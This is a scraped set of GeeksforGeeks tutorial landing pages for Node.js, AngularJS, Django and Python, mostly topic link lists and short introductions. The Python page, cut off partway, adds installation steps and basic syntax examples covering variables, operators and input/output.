Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects NodeJS Tutorials Node.js is an open source and cross-platform runtime environment for executing JavaScript code outside of a browser. You need to remember that NodeJS is not a framework and it’s not a programming language. Most of the people are confused and understand it’s a framework or a programming language. We often use Node.js for building back-end services like APIs like Web App or Mobile App. It’s used in production by large companies such as Paypal, Uber, Netflix, Walmart and so on. ‘Recent Articles’ on Nodejs Topics : Introduction Node Jimp Node URL Misc Introduction: Intoduction To NodeJS Difference between NodeJS and AngularJS Introduction To Nodejs and MongoDB Introduction To Express Node JIMP: Node Jimp | Introduction Node Jimp | Color Green Node Jimp | Color Red Node Jimp | Color xor Node Jimp | Color Desaturate Node Jimp | Color Mix Node Jimp | Color Tint Node Jimp | Color Shade Node Jimp | Color Hue Node Jimp | Color Brighten Node Jimp | Color Darken Node Jimp | Color Spin Node Jimp | Color Greyscale Node Jimp | Color Saturate Node Jimp | Color Lighten Node Jimp | Color Gaussian Node Jimp | Color Pixelate Node Jimp | Color Normalize Node Jimp | Color Brightness Node Jimp | Color Contrast Node Jimp | Color Sepia Node Jimp | Color Opacity More>> Node URL API: Node | URL.hash API Node | URL.host API Node | URL.href API Node | URL.password API Node | URL.pathname API Node | URL.port API Node | URL.username API Node | URL.origin API Node | urlObject.auth API Node | urlObject.protocol API Node | urlObject.search API Node | URL.hostname API More>> Misc: Exception Handling In Node NodeJS | DNS setServers Nodejs | authentication using Passportjs and passport-local-mongoose Deploying Node Applications NodeJS | Automatic restart NodeJs server with nodemon NodeJS | Building simple REST API in Express Dockerizing a simple NodeJS App If you like GeeksforGeeks and would like to contribute, you can also write an article and mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try Once Most Visited Articles How to find index of a given element in a Vector in C++How to update Node.js and NPM to next version ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas?Replace NaN Values with Zeros in Pandas DataFrame room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

AngularJS Tutorials - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ AngularJS Basicsexpand_moreAngularJS TutorialsIntroduction to AngularJSAngular CLI | Angular Project SetupAngularJS | ExpressionsAngularJS | ModulesAngularJS | ng-model DirectiveAngularJS | Data BindingAngularJS | ControllersAngularJS | ScopeAngularJS | ServicesAngularJS | AJAX – $httpAngularJS | TablesAngularJS | Select BoxesAngularJS | SQLAngularJS | HTML DOMAngularJS | EventsAngularJS | FormsAngularJS | Form ValidationAngularJS | APIAngularJS and W3.CSSAngularJS | IncludesAngularJS | AnimationsAngularJS | RoutingAngularJS | ApplicationAngularJS Directivesexpand_moreAngularJS | DirectivesAngularJS | ng-app DirectiveAngularJS | ng-bind DirectiveAngularJS | ng-bind-html DirectiveAngularJS | ng-bind-template DirectiveAngularJS | ng-blur DirectiveAngularJS | ng-change DirectiveAngularJS | ng-checked DirectiveAngularJS | ng-class DirectiveAngularJS | ng-class-even DirectiveAngularJS | ng-class-odd DirectiveAngularJS | ng-click DirectiveAngularJS | ng-cloak DirectiveAngularJS | ng-controller DirectiveAngularJS Directives Complete ReferenceAngularJS Filtersexpand_moreAngularJS | FiltersAngularJS | currency FilterAngularJS | date FilterAngularJS | filter FilterAngularJS | json FilterAngularJS | limitTo FilterAngularJS | lowercase FilterAngularJS | number FilterAngularJS | orderBy FilterAngularJs | uppercase FilterAngularJS Converting Functionsexpand_moreAngularJS | angular.lowercase() FunctionAngularJS | angular.uppercase() FunctionAngularJS | angular.forEach() FunctionAngularJS Comparing Functionsexpand_moreAngularJS | angular.isArray() FunctionAngularJS | angular.isDate() FunctionAngularJS | angular.isDefined() FunctionAngularJS | angular.isElement() FunctionAngularJS | angular.isFunction() FunctionAngularJS | angular.isNumber() FunctionAngularJS | angular.isObject() FunctionAngularJS | angular.isString() FunctionAngularJS | angular.isUndefined() FunctionAngularJS | angular.equals() FunctionAngularJS JSON Functionexpand_moreAngularJS | angular.toJson() FunctionAngularJS Other Functionsexpand_moreHow to bundle an Angular app for production?How to add many functions in one ng-click directive?How to directly update a field by using ng-click in AngularJS ?How to Add Dynamic Options for Multiple Selects Inside ng-repeat Directive ?How to detect when an @Input() value changes in Angular?How to open popup using Angular and Bootstrap ?How to reload or re-render the entire page using AngularJS?How to add input fields dynamically on button click in AngularJS ?How to create button dynamically with click event in Angular ?How to use jQuery in Angular ? AngularJS Tutorials AngularJs was originally developed in 2008-2009 by Misko Hevery and Adam Abrons and is now maintained by Google. AngularJs is a Javascript open source front-end framework that is mainly used to develop single page web applications(SPAs). It is a continuously growing and expanding framework which provides better ways for developing web applications. It changes the static HTML to dynamic HTML. It’s features like dynamic binding and dependency injection eliminates the need for code that we have to write otherwise.AngularJs is rapidly growing and because of this reason, we have different versions of AngularJs with the latest stable being 1.7.7. It is also important to note that Angular is different from AngularJs. It is an open source project which can be freely used and changed by anyone. It extends HTML attributes with Directives, and data is bound with HTML. ‘Recent Articles’ on AngularJS Topics : Basics AngularJS Directives AngularJS Functions Misc Basics: AngularJS | Introduction AngularJS | Data Binding AngularJS | Expressions AngularJS | Services AngularJS | HTML DOM AngularJS | Form Validation AngularJS | API Angular Directives: AngularJS | ng-list Directive AngularJS | ng-disabled Directive AngularJS | ng-mouseup Directive AngularJS | ng-keyup Directive AngularJS | ng-focus Directive AngularJS | ng-keypress Directive AngularJS | ng-hide Directive AngularJS | ng-dblclick Directive AngularJS | ng-mousedown Directive AngularJS | ng-change Directive AngularJS | ng-maxlength Directive AngularJS | ng-blur Directive AngularJS | ng-controller Directive AngularJS | ng-mouseleave Directive AngularJS | ng-bind Directive AngularJS | ng-mouseenter Directive AngularJS | ng-click Directive AngularJS | ng-copy Directive AngularJS | ng-mousemove Directive AngularJS | ng-minlength Directive AngularJS | ng-checked Directive AngularJS | ng-if Directive AngularJS | ng-cut Directive AngularJS | ng-readonly Directive More>> AngularJS Functions AngularJS | angular.isElement() Function AngularJS | angular.isFunction() Function AngularJS | angular.isNumber() Function AngularJS | angular.isDefined() Function AngularJS | angular.isDate() Function AngularJS | angular.isString() Function AngularJS | angular.isUndefined() Function AngularJS | angular.isObject() Function AngularJS | angular.isBind() Function AngularJS | angular.equals() Function More>> Misc: Difference between NodeJS and AngularJS Difference between bootstrap and AngularJS If you like GeeksforGeeks and would like to contribute, you can also write an article and mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseTypes of Environments in AITop 40 Python Interview Questions & AnswersProof that Clique Decision problem is NP-Complete | Set 2 Most Visited Articles Difference between List VS Set VS Tuple in PythonMajor Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try OnceFibonacci Series Program in JavaScriptHow to send an email from JavaScript ? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Django Tutorial - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Django TutorialDjango BasicsDjango Introduction and InstallationDjango Project MVT StructureHow to Create a Basic Project using MVT in Django ?How to Create an App in Django ?Django FormsRender HTML Forms (GET & POST) in DjangoDjango form field custom widgetsDjango ModelForm – Create form from ModelsDjango FormsetsDjango ModelFormSetsDjango TemplatesViews In Django | PythonDjango CRUD (Create, Retrieve, Update, Delete) Function Based ViewsClass Based Generic Views Django (Create, Retrieve, Update, Delete)Createview – Class Based Views DjangoListView – Class Based Views DjangoDetailView – Class Based Views DjangoDetail View – Function based Views DjangoAdding new column to existing DataFrame in PandasPython map() functionTaking input in PythonIterate over a list in PythonEnumerate() in PythonHow to get column names in Pandas dataframePython program to convert a list to stringReading and Writing to text files in PythonPython String | replace()Read a file line by line in Python Django Tutorial Last Updated: 26-02-2020 Django is a Python-based web framework that allows you to quickly create efficient web applications. It is also called batteries included framework because Django provides built-in features for everything including Django Admin Interface, default database – SQLlite3, etc. When you’re building a website, you always need a similar set of components: a way to handle user authentication (signing up, signing in, signing out), a management panel for your website, forms, a way to upload files, etc. Django gives you ready-made components to use and that too for rapid development. Why Django Framework ? Excellent documentation and high scalability. Used by Top MNCs and Companies, such as Instagram, Disqus, Spotify, Youtube, Bitbucket, Dropbox, etc. and the list is never-ending. Easiest Framework to learn, rapid development and Batteries fully included. The last but not least reason to learn Django is Python, Python has huge library and features such as Web Scrapping, Machine Learning, Image Processing, Scientific Computing, etc. One can integrate it all this with web application and do lots and lots of advance stuff. Recent Articles on Django !! Django Basics Django Basics Django Introduction and Installation When to Use Django? Comparison with other Development Stacks Django Project MVT Structure How to Create a Basic Project using MVT in Django ? How to Create an App in Django ? Django Forms Django Forms How to create a form using Django Forms ? Render HTML Forms (GET & POST) in Django Django Form Fields form field custom widgets Initial form data – Django Forms ModelForm – Create form from Models Render Form Fields Manually Django Formsets Django ModelFormSets Django Templates Django Templates Template Filters Template Tags variables Boolean Operators for loop if – Django Templates Template Inheritance Misc Handling Ajax request in Django User groups with Custom permissions in Django Django Admin Interface Extending and customizing django-allauth Django – Dealing with warnings Sessions framework using django Django Sign Up and login with confirmation Email Django Views Django Views Function Based Views Create View List View Detail View Update View Delete View Class Based Generic Views Django Createview ListView DetailView UpdateView DeleteView FormView Django Models Django Models ORM – Inserting, Updating & Deleting Data Basic App Model – Makemigrations and Migrate model data types and fields list Add the slug field inside Django Model Intermediate fields in Django Uploading images in Django Render Model in Django Admin Interface Change Object Display Name using __str__ function – Django Models Built-in Field Validations – Django Models Custom Field Validations in Django Models How to use Django Field Choices ? Overriding the save method – Django Models Projects Google authentication and Fetching mails from scratch ToDo webapp using Django Django News App Weather app using Django Attention geek! Strengthen your foundations with the Python Programming Foundation Course and learn the basics. To begin with, your interview preparations Enhance your Data Structures concepts with the Python DS Course. My Personal Notes arrow_drop_up Save Recommended Posts:Styling Django Forms with django-crispy-formsAdding Tags Using Django-Taggit in Django ProjectKivy TutorialPandas TutorialPython Requests TutorialPython Tkinter TutorialSelenium Python TutorialPython MongoDB TutorialOpenCV Python TutorialHandling Ajax request in Djangonow - Django Template TagsPython | User groups with Custom permissions in DjangoPython | Django Admin InterfacePython | Django-allauth setup and ConfigurationPython Django | Google authentication and Fetching mails from scratchPython | Uploading images in DjangoAdd the slug field inside Django ModelIntermediate fields in Django | PythonDjango - Dealing with warningsDjango - Creating Apps | Set - 1 Article Tags : PythonPython Django thumb_up 18 To-do Done 2.1 Based on 6 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Template Method – Python Design Patterns Next last_page Web Scrapping – Legal or Illegal? Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Python Python Dictionaryappend() and extend() in PythonPython String | split()Different ways to create Pandas DataframePython Lists More related articles in Python Python String find()Python | Get a list as input from userPrint lists in Python (4 Different Ways)GET and POST requests using Pythonsum() function in Python room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Python Tutorial - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Python TutorialPython Language IntroductionPython 3 basicsImportant differences between Python 2.x and Python 3.x with examplesDownload and Install Python 3 Latest VersionStatement, Indentation and Comment in PythonPython | Set 2 (Variables, Expressions, Conditions and Functions)Global and Local Variables in PythonType Conversion in PythonPrivate Variables in Python__name__ (A Special variable) in PythonTaking input in PythonTaking multiple inputs from user in PythonPython | Output using print() functionPython end parameter in print()Python | Output FormattingPython OperatorsTernary Operator in PythonOperator Overloading in PythonPython | a += b is not always a = a + bDifference between == and is operator in PythonPython | Set 3 (Strings, Lists, Tuples, Iterations)Python StringPython ListsPython TuplesAdding new column to existing DataFrame in PandasPython map() functionIterate over a list in PythonEnumerate() in Python Python Tutorial Python is a high-level programming language and is widely being used among the developers’ community. Python was mainly developed for emphasis on code readability, and its syntax allows programmers to express concepts in fewer lines of code. Python is a programming language that lets developers work quickly and integrate systems more efficiently. This Python 3 tutorial provides learners (either beginner or experienced developer) with the topics from Python basics to advanced topics with examples. Topics: Key features and applications Download and installation How to run a Python program Fundamentals of Python Indentation Comments Variables Operators Basics of Input/Output Data types Numeric String List Tuple Boolean Set Dictionary Decision making Control flow (Loops) While and while-else loop For and for-else loop range() function Loop control statements Break Continue pass Functions Function with arguments Lambda functions OOPS concept Class and Objects Constructors and Destructors Inheritance Encapsulation Polymorphism File Handling Modules and Packages Regular expressions Exception handling Key features Python has many reasons for being popular and in demand. A few of the reasons are mentioned below. Emphasis on code readability, shorter codes, ease of writing. Programmers can express logical concepts in fewer lines of code in comparison to languages such as C++ or Java. Python supports multiple programming paradigms, like object-oriented, imperative and functional programming or procedural. It provides extensive support libraries(Django for web development, Pandas for data analytics etc) Dynamically typed language(Data type is based on value assigned) Philosophy is “Simplicity is the best”. Application Areas Getting started with Python Python is a lot easier to code and learn. Python programs can be written on any plain text editor like notepad, notepad++, or anything of that sort. One can also use an online IDE for writing Python codes or can even install one on their system to make it more feasible to write these codes because IDEs provide a lot of features like intuitive code editor, debugger, compiler, etc. To begin with, writing Python Codes and performing various intriguing and useful operations, one must have Python installed on their System. This can be done by following the step by step instructions provided below: What if Python already exists? Let’s check Windows don’t come with Python preinstalled, it needs to be installed explicitly. But unlike windows, most of the Linux OS have Python pre-installed, also macOS comes with Python pre-installed. To check if your device is pre-installed with Python or not, just go to Command Line(For Windows, search for cmd in the Run dialog( + R), for Linux open the terminal using Ctrl+Alt+T, for macOS use control+Option+Shift+T. Now run the following command: For Python2 python --version For Python3 python3 --version If Python is already installed, it will generate a message with the Python version available. Download and Installation Before starting with the installation process, you need to download it. For that all versions of Python for Windows, Linux, and MacOS are available on python.org. Windows Linux MacOS Download the Python and follow the further instructions for the installation of Python. Beginning the installation. Windows Run the Python Installer from downloads folder. Make sure to mark Add Python 3.7 to PATH otherwise you will have to do it explicitly. It will start installing python on windows. After installation is complete click on Close. Bingo..!! Python is installed. Now go to windows and type IDLE. Linux For almost every Linux system, the following commands would work definitely. $ sudo add-apt-repository ppa:deadsnakes/ppa $ sudo apt-get update $ sudo apt-get install python3.8 To verify the installation enter following commands in your Terminal. python3 MacOS Download and install Homebrew Package Manager Enter following command in macOS terminal. /usr/bin/ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)" Enter system password if prompted. This will install the Homebrew package Manager on your OS. After you see a message called “Installation Successful”. You are ready to install python version 3 on your macOS. Install Python Latest Version on macOS / macOS X Open Terminal and enter the following command. brew install python3 After command processing is complete, Python’s version 3 would be installed on your mac. To verify the installation enter following commands in your Terminal app pythona fa-hand-o-right pip3 How to run a Python program Let’s consider a simple Hello World Program. # Python program to print # Hello World print("Hello World") Generally, there are two ways to run a Python program. Using IDEs: You can use various IDEs(Pycharm, Jupyter Notebook, etc.) which can be used to run Python programs. Using Command-Line: You can also use command line options to run a Python program. Below steps demonstrate how to run a Python program on Command line in Windows/Unix Operating System: Windows Open Commandline and then to compile the code type python HelloWorld.py. If your code has no error then it will execute properly and output will be displayed. Unix/Linux Open Terminal of your Unix/Linux OS and then to compile the code type python HelloWorld.py. If your code has no error then it will execute properly and output will be displayed. Fundamentals of Python Python Indentation Python uses indentation to highlight the blocks of code. Whitespace is used for indentation in Python. All statements with the same distance to the right belong to the same block of code. If a block has to be more deeply nested, it is simply indented further to the right. You can understand it better by looking at the following lines of code. # Python program showing # indentation site = 'gfg' if site == 'gfg': print('Logging on to geeksforgeeks...') else: print('retype the URL.') print('All set !') Output: Logging on to geeksforgeeks... All set ! The lines print(‘Logging on to geeksforgeeks…’) and print(‘retype the URL.’) are two separate code blocks. The two blocks of code in our example if-statement are both indented four spaces. The final print(‘All set!’) is not indented, and so it does not belong to the else-block. Note: For more information, refer 👉🏽 Indentation in Python. Python Comments Comments are useful information that the developers provide to make the reader understand the source code. It explains the logic or a part of it used in the code. There are two types of comment in Python: Single line comments: Python single line comment starts with hashtag symbol with no white spaces. # This is a comment # Print “GeeksforGeeks !” to console print("GeeksforGeeks") Multi-line string as comment: Python multi-line comment is a piece of text enclosed in a delimiter (“””) on each end of the comment. """ This would be a multiline comment in Python that spans several lines and describes geeksforgeeks. A Computer Science portal for geeks. It contains well written, well thought and well-explained computer science and programming articles, quizzes and more. … """ print("GeeksForGeeks") Note: For more information, refer 👉🏽 Comments in Python. Variables Variables in Python are not “statically typed”. We do not need to declare variables before using them or declare their type. A variable is created the moment we first assign a value to it. #!/usr/bin/python # An integer assignment age = 45 # A floating point salary = 1456.8 # A string name = "John" print(age) print(salary) print(name) Output: 45 1456.8 John Note: For more information, refer 👉🏽 Python Variables. Operators Operators are the main building block of any programming language. Operators allow the programmer to perform different kinds of operations on operands. These operators can be categorized based upon their different functionality: Arithmetic operators: Arithmetic operators are used to perform mathematical operations like addition, subtraction, multiplication and division. # Examples of Arithmetic Operator a = 9 b = 4 # Addition of numbers add = a + b # Subtraction of numbers sub = a - b # Multiplication of number mul = a * b # Division(float) of number div1 = a / b # Division(floor) of number div2 = a // b # Modulo of both number mod = a % b # print results print(add) print(sub) print(mul) print(div1) print(div2) print(mod) Output: 13 5 36 2.25 2 1 Relational Operators: Relational operators compares the values. It either returns True or False according to the condition. # Examples of Relational Operators a = 13 b = 33 # a > b is False print(a > b) # a < b is True print(a < b) # a == b is False print(a == b) # a != b is True print(a != b) # a >= b is False print(a >= b) # a <= b is True print(a <= b) Output: False True False True False True Logical Operators: Logical operators perform Logical AND, Logical OR and Logical NOT operations. # Examples of Logical Operator a = True b = False # Print a and b is False print(a and b) # Print a or b is True print(a or b) # Print not a is False print(not a) Output: False True False Bitwise operators: Bitwise operator acts on bits and performs bit by bit operation. # Examples of Bitwise operators a = 10 b = 4 # Print bitwise AND operation print(a & b) # Print bitwise OR operation print(a | b) # Print bitwise NOT operation print(~a) # print bitwise XOR operation print(a ^ b) # print bitwise right shift operation print(a >> 2) # print bitwise left shift operation print(a << 2) Output: 0 14 -11 14 2 40 Assignment operators: Assignment operators are used to assign values to the variables. Special operators: Special operators are of two types- Identity operator that contains is and is not. Membership operator that contains in and not in. # Examples of Identity and # Membership operator a1 = 'GeeksforGeeks' b1 = 'GeeksforGeeks' # Identity operator print(a1 is not b1) print(a1 is b1) # Membership operator print("G" in a1) print("N" not in b1) Output: False True True True Note: For more information, refer 👉🏽 Basic Operators in Python. Basics of Input/Output Taking input from user – Python provides us with two inbuilt functions to read the input from the keyboard. raw_input(): This function works in older version (like Python 2.x). This function takes exactly what is typed from the keyboard, convert it to string and then return it to the variable in which we want to store. For example: # Python program showing # a use of raw_input() g = raw_input("Enter your name : ") print g input(): This function first takes the input from the user and then evaluates the expression, which means Python automatically identifies whether the user entered a string or a number or list. For example: # Python program showing # a use of input() val = input("Enter your value: ") print(val) Note: For more information, refer 👉🏽 Python input() and raw_input(). Printing output to console – The simplest way to produce output is using the print() function where you can pass zero or more expressions separated by commas. This function converts the expressions you pass into a string before writing to the screen. # Python 3.x program showing # how to print data on # a screen # One object is passed print("GeeksForGeeks") x = 5 # Two objects are passed print("x =", x) # code for disabling the softspace feature print('G', 'F', 'G', sep ='') # using end argument print("Python", end = '@') print("GeeksforGeeks") Output: GeeksForGeeks x = 5 GFG Python@GeeksforGeeks Data Types Data types are the classification or categorization of data items. It represents the kind of value that tells what operations can be performed on a particular data. Since everything is an object in Python programming, data types are actually classes and variables are instance (object) of these classes. Numeric In Python, numeric data type represent the data which has numeric value. Numeric value can be interger, floating number or even complex numbers. These values are defined as int, float and complex class in Python. # Python program to # demonstrate numeric value print("Type of a: ", type(5)) print("\nType of b: ", type(5.0)) c = 2 + 4j print("\nType of c: ", type(c)) Output: Type of a: <class 'int'> Type of b: <class 'float'> Type of c: <class 'complex'> Sequence Type In Python, a sequence is the ordered collection of similar or different data types. Sequences allow storing multiple values in an organized and efficient fashion. There are several sequence types in Python – String List Tuple 1) String: A string is a collection of one or more characters put in a single quote, double-quote or triple quote. In python there is no character data type, a character is a string of length one. It is represented by str class. Strings in Python can be created using single 